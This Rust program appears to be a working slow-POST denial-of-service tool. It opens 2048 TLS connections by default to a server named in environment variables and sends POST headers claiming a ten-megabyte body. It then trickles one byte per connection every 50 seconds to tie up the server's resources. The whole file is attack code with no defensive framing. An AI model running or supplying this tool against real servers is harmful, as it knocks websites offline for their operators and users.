extern crate futures;
extern crate native_tls;

extern crate tokio_core;
extern crate tokio_timer;
extern crate tokio_tls;

use native_tls::TlsConnector;
use std::env;
use std::io::Write;
use std::time::Duration;

use std::io;
use std::net::ToSocketAddrs;

use futures::*;
use tokio_core::reactor::Core;
use tokio_core::net::TcpStream;
use tokio_tls::TlsConnectorExt;
use tokio_timer::*;

fn main() {
    let host = env::var("HOST").expect("Provide HOST environment variable.");
    let path = env::var("URL_PATH").expect("Provide URL_PATH environment variable.");
    let default_port: Result<String, &str> = Ok("443".to_owned());
    let port = env::var("PORT").or(default_port).unwrap();
    let default_content_length: Result<String, &str> = Ok("10000000".to_owned());
    let content_length = env::var("CONTENT_LENGTH").or(default_content_length).unwrap();

    let default_timeout: Result<String, &str> = Ok("50".to_owned());
    let timeout: u64 = env::var("TIMEOUT_SEC").or(default_timeout).unwrap().parse().unwrap();
    let default_connections_count: Result<String, &str> = Ok("2048".to_owned());
    let connections_count: usize = env::var("CONNECTIONS_COUNT").or(default_connections_count).unwrap().parse().unwrap();

    let mut core = Core::new().unwrap();
    let handle = core.handle();

    let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, host, content_length);
    let timer = Timer::default();
    let addr = format!("{}:{}", host, port).to_socket_addrs().unwrap().next().unwrap();

    for connection_number in 0..connections_count {
        let timer = timer.clone();
        let handle = handle.clone();
        let host = host.clone();
        let start = start.clone();

        let connector = TlsConnector::builder().unwrap().build().unwrap();
        let socket = TcpStream::connect(&addr, &handle);

        let handshake = socket.and_then(move |socket| {
            connector.connect_async(&host, socket).map_err(|e| { io::Error::new(io::ErrorKind::Other, e) })
        });

        let outer_handle = handle.clone();
        let outer_connection_number = connection_number.clone();
        let connection = handshake.and_then(move |mut socket| {
            let _start_written = socket.write(start.as_bytes());
            let _start_flushed = socket.flush();

            let interval = timer.interval(Duration::from_secs(timeout)).for_each(move |_| {
                let _byte_written = socket.write(b"a");
                let _byte_flushed = socket.flush();
                println!("Stream number: {} written.", connection_number);
                Ok(())
            });
            
            handle.spawn(interval.map_err(|e| panic!("{}", e)));
            println!("Stream number: {} spawned.", connection_number);
            Ok(())
        });
        outer_handle.spawn(connection.map_err(move |e| println!("Connection: {} failed! Reason: {}", outer_connection_number, e)));
    }

    let empty: futures::Empty<(), ()> = future::empty();
    let _core_started = core.run(empty);
}